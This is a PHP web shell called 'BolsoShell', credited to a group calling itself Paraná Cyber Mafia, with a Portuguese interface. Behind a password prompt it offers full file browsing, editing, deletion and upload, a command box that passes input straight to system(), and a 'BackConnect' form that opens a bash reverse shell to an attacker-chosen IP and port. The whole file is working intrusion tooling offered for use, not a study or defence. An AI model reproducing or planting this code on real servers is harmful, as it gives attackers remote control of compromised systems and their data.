<?php
//Codado por @PrCyberMafia
//Todos os direitos reservados
//Versão 1.0
// COLOQUE A SENHA DE SUA PREFERÊNCIA EM HASH MD5
$hash_senha = "909056298fb569d2cd5d417f399e9bb0";
@session_start();

if(@!$_SESSION['logado'] === true){
	if(isset($_POST['senha']) && md5($_POST['senha']) === $hash_senha){
		$_SESSION['logado'] = true;
	}else{
		die('<!DOCTYPE html><html><head><meta charset="utf-8"><title>BolsoShell - By Paraná Cyber Mafia</title><style>body {background-color: black;} h1 {color: red;font-weight: normal;font-size:13px;}input[type=password]{border: 3px solid #555;}input[type=password]:hover{box-shadow: 0 0 11px green;}input[type=submit]{border: 3px solid #555;}input[type=submit]:hover{box-shadow: 0 0 11px green;}</style></head><body><center><img src="https://i.imgur.com/Qv4ZAwf.gif"><h1>[bolsonaro@server]# echo "Pwned"</h1><h1>Pwned</h1><form method="POST"><input type="password" name="senha" placeholder="Senha da Shell"><input type="submit" value="Entrar"></form></center></body></html>');
	}
}
if(!$_SESSION['logado'] === false){
	if(isset($_GET['sair'])){
		$_SESSION['logado'] = false;
		echo '<h1 id="sair">Você saiu com sucesso!</h1>';
	}
}
$baseDir = getcwd();
$atualDir = @$_GET['diretorio'] ? $_GET['diretorio'] : $baseDir;
@$abreDir = dir($atualDir);
if(strtolower(substr(PHP_OS, 0, 3)) === 'win'){
	$sistema = 'Windows';
	$barra = '\\';
}else{
	$sistema = 'NotWindows';
	$barra = '/';
}
$strrdir = strrpos(substr($atualDir,0,-1),$barra);
$voltaDir = substr($atualDir,0,$strrdir+1);
if(!isset($_GET['diretorio'])){
	$acao = 'navegacaoArquivos';
}
if(isset($_GET['diretorio'])){
	$acao = 'navegacaoArquivos';
}
if(isset($_GET['diretorio']) && isset($_GET['arquivo'])){
	$acao = 'visualizacaoArquivos';
}
if(isset($_GET['diretorio']) && isset($_GET['editar_arquivo'])){
	$acao = 'edicaoArquivos';
}
if(isset($_GET['diretorio']) && isset($_GET['excluir_arquivo'])){
	$acao = 'exclusaoArquivos';
}
if(isset($_GET['cmd'])){
	$acao = 'commandLine';
}
if(isset($_GET['sobre'])){
	$acao = 'sobre';
}
if(isset($_GET['bc'])){
	$acao = 'backconnect';
}
if(isset($_GET['upload'])){
	$acao = 'uploader';
}
function navegacaoArquivosTop(){
	echo '<em><h1 style="display: inline-block;font-weight: bold;"><i class="fa fa-file" aria-hidden="true"></i>
Gerenciador de Arquivos</h1><a style="text-decoration: none;color: red;" href="?diretorio='.$GLOBALS['voltaDir'].'"> <i class="fa fa-arrow-left" aria-hidden="true"></i></a></em>';
	echo '<table width="100%" border="1" cellspacing="0" cellpadding="5">';
}
function navegacaoArquivosView(){
	while($nomes = $GLOBALS['abreDir']->read()):
	switch(is_dir($GLOBALS['atualDir'].$nomes)){
		case true:
		switch($GLOBALS['sistema']){
			case 'Windows':
			$href = '?diretorio='.$GLOBALS['atualDir'].'\\'.$nomes.$GLOBALS['barra'];
			break;
			case 'NotWindows':
			$href = '?diretorio='.$GLOBALS['atualDir'].'/'.$nomes.$GLOBALS['barra'];
			break;
		}
		break;

		case false:
		$href = '?diretorio='.$GLOBALS['atualDir'].$GLOBALS['barra'].'&arquivo='.$nomes;
		break;
	}
	if(is_dir($GLOBALS['atualDir'].$nomes)){
		$icone = '<i class="fa fa-folder-open" aria-hidden="true"></i>';
	}else{
		$icone = '<i class="fa fa-file" aria-hidden="true"></i>';
	}
	echo '<tr>';
	echo '<td><h1><a style="text-decoration: none;color: white;" href="'.$href.'">'.$icone.' - '.$nomes.'</a></h1></td>';
	echo '<td><h1><a style="text-decoration: none;color: white;" href="'.$href.'"><i class="fa fa-eye" aria-hidden="true"></i></a></h1></td>';
	echo '</tr>';
	endwhile;
	echo '</table>';
	$GLOBALS['abreDir']->close();
}
function visualizacaoArquivosTop(){
	echo '<em><h1 style="display: inline-block;font-weight: bold;"><i class="fa fa-file" aria-hidden="true"></i>
Gerenciador de Arquivos</h1></em>';
	echo '<h1>Arquivo: '.@$_GET['arquivo'].'</h1><a style="text-decoration: none;color: green;" href="?diretorio='.$GLOBALS['atualDir'].'&editar_arquivo='.@$_GET['arquivo'].'">Editar</a><a style="text-decoration: none;color: red;" href="?diretorio='.$GLOBALS['atualDir'].'&excluir_arquivo='.@$_GET['arquivo'].'"> Excluir</a>';
}
function visualizacaoArquivosView(){
	if(file_exists($GLOBALS['atualDir'].$_GET['arquivo'])){
		$info = htmlentities(file_get_contents($GLOBALS['atualDir'].$_GET['arquivo']));
		echo '<table width="100%" border="1" cellspacing="0" cellpadding="5"><tr><td><h1 class="edit-arquivo">'.nl2br($info).'</h1></td></tr></table>';
	}else{
		echo '<h1>O arquivo solicitado não foi encontrado no servidor.</h1>';
	}
}
function edicaoArquivosTop(){
	echo '<em><h1 style="display: inline-block;font-weight: bold;"><i class="fa fa-file" aria-hidden="true"></i>
Edição de Arquivo</h1></em>';
}
function edicaoArquivosView(){
	if(file_exists($GLOBALS['atualDir'].$_GET['editar_arquivo'])){
		$info = htmlentities(file_get_contents($GLOBALS['atualDir'].$_GET['editar_arquivo']));
		echo '<form method="POST" action=""><textarea style="width: 100%;height: 700px;" name="arquivo">'.$info.'</textarea><input type="submit" value="Salvar"></form>';
		if(isset($_POST['arquivo'])){
			file_put_contents($GLOBALS['atualDir'].$_GET['editar_arquivo'], $_POST['arquivo']);
			echo '<h1 style="color: green;">O comando foi executado, verifique se o arquivo foi salvo, caso contrário você não possui privilégios suficientes.</h1>';
		}
	}else{
		echo '<h1>O arquivo solicitado não foi encontrado no servidor.</h1>';
	}
}
function commandLineTop(){
	echo '<em><h1 style="display: inline-block;font-weight: bold;"><i class="fa fa-terminal" aria-hidden="true"></i>
Linha de Comando</h1></em>';
function commandLine(){
	if(isset($_GET['cmd'])){
		echo '<form method="POST"><input style="width: 100%;" type="text" name="comando"><input type="submit" value="Executar"></form>';
		if(isset($_POST['comando'])){
			echo '<h1 style="color: green;">Comando executado!</h1>';
			echo '<h1>';
			system($_POST['comando']);
			echo '</h1>';
		}
	}
}
}
function sobreTop(){
	echo '<em><h1 style="display: inline-block;font-weight: bold;"><i class="fa fa-question-circle" aria-hidden="true"></i>
Sobre</h1></em>';
}
function sobreView(){
	echo '<h1 style="font-size: 18px;">Shell Codada pelo Shawty Boy da Paraná Cyber Mafia</h1><h1 style="font-size: 18px;">ParanaCyberMafia@protonmail.com - @PrCyberMafia</h1></h1><h1 style="font-size: 18px;">Funções da Shell:</h1><h1 style="font-size: 18px;">- Gerenciador de Arquivos<br>- Linha de Comando<br>- BackConnect (Funciona somente com a função system ativada)</h1>';
}
function bcTop(){
	echo '<em><h1 style="display: inline-block;font-weight: bold;"><i class="fa fa-retweet" aria-hidden="true"></i>
BackConnect</h1></em>';
}
function bcView(){
	echo '<form method="POST"><input placeholder="IP" type="text" name="ip"><br><input placeholder="Porta" type="text" name="porta"><br><input type="submit" value="Conectar"></form>';
	if(isset($_POST['ip']) && isset($_POST['porta'])){
		system('bash -i >& /dev/tcp/'.$_POST['ip'].'/'.$_POST['porta'].' 0>&1');
		echo '<h1 style="color: green;">Verifique seu terminal.</h1>';
	}
}
function uploadTop(){
	echo '<em><h1 style="display: inline-block;font-weight: bold;"><i class="fa fa-upload" aria-hidden="true"></i>
Upar arquivos</h1></em>';
}
function uploadView(){
	echo '<form method="POST" enctype="multipart/form-data"><input type="text" value="'.$GLOBALS['atualDir'].'" name="path_upload""><input type="file" name="arquivo_upload"><br><input type="submit" value="Upload"></form>';
	if(isset($_FILES['arquivo_upload']) && isset($_POST['path_upload'])){
		if(is_dir($_POST['path_upload'])){
			move_uploaded_file($_FILES['arquivo_upload']['tmp_name'], $_POST['path_upload'].$GLOBALS['barra'].$_FILES['arquivo_upload']['name']);
			echo '<h1 style="color: green;">O comando foi executado.</h1>';
		}else{
			echo '<h1 style="color: red;">O diretório informado não é válido.</h1>';
		}
	}
}
function excluirArquivo(){
	if(file_exists($_GET['diretorio'].$_GET['excluir_arquivo'])){
		unlink($_GET['diretorio'].$_GET['excluir_arquivo']);
		header("Location: ".basename(__FILE__));
	}else{
		echo '<h1 style="color: red;">Você não pode excluir um arquivo que não existe.</h1>';
	}
}
?>
<!DOCTYPE html>
<html>
<head>
	<title>BolsoShell - By Paraná Cyber Mafia</title>
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<style>
#sair{
	color: red;
	font-weight: normal;
	font-size:14px;
}
header{
	min-height: 200px;
}
header img{
	width: 150px;
	height: 150px;
	float: right;
}
header a:hover{
	box-shadow: 0 0 11px green;
}
header a{
	padding-left: 5px;
}
body{
	background-color: black;
}
.conteudo-shell{
	min-height: 600px;
}
.edit-arquivo{
	font-size: 20px;
}
h1{
	color: white;
	font-weight: normal;
	font-size:14px;

}
</style>
</head>
<body>
<header>
	<img src="https://i.imgur.com/jZGC91q.jpg">
	<h1>Sistema: <?php echo php_uname(); ?></h1>
	<h1>Usuário: <?php echo get_current_user(); ?></h1>
	<h1>IP do Servidor: <?php echo $_SERVER['SERVER_ADDR']; ?></h1>
	<h1>Diretório atual: <?php echo $atualDir; ?></h1>
	<a style="text-decoration: none;color: white;" href="<?php echo basename(__FILE__); ?>"><i class="fa fa-folder-open" aria-hidden="true"></i> Gerenciador</a>
	<a style="text-decoration: none;color: white;" href="?cmd"><i class="fa fa-terminal" aria-hidden="true"></i> Linha de Comando</a>
	<a style="text-decoration: none;color: white;" href="?bc"><i class="fa fa-retweet" aria-hidden="true"></i> BackConnect</a>
	<a style="text-decoration: none;color: white;" href="?upload"><i class="fa fa-upload" aria-hidden="true"></i> Upload</a>
	<a style="text-decoration: none;color: white;" href="?sobre"><i class="fa fa-question-circle" aria-hidden="true"></i> Sobre</a>
	<a style="text-decoration: none;color: white;" href="?sair"><i class="fa fa-sign-out" aria-hidden="true"></i> Sair</a>
	<br><br><br><br><br>
	<hr>
</header>
<div class="conteudo-shell">
	<?php
	switch ($acao) {
		case 'navegacaoArquivos':
			navegacaoArquivosTop();
			break;
		
		case 'visualizacaoArquivos':
			visualizacaoArquivosTop();
			break;
		case 'edicaoArquivos':
			edicaoArquivosTop();
			break;
		case 'exclusaoArquivos':
			excluirArquivo();
			break;
		case 'commandLine':
			commandLineTop();
			break;
		case 'sobre':
			sobreTop();
			break;
		case 'backconnect':
			bcTop();
			break;
		case 'uploader':
			uploadTop();
			break;
	}
	?>
<hr>
<?php
	switch ($acao) {
		case 'navegacaoArquivos':
			navegacaoArquivosView();
			break;
		
		case 'visualizacaoArquivos':
			visualizacaoArquivosView();
			break;
		case 'edicaoArquivos':
			edicaoArquivosView();
			break;
		case 'commandLine':
			commandLine();
			break;
		case 'sobre':
			sobreView();
			break;
		case 'backconnect':
			bcView();
			break;
		case 'uploader':
			uploadView();
			break;
	}
?>
</div>
<footer>
<hr>
	<h1>Codado Por : Shawty Boy</h1>
</footer>
</body>
</html>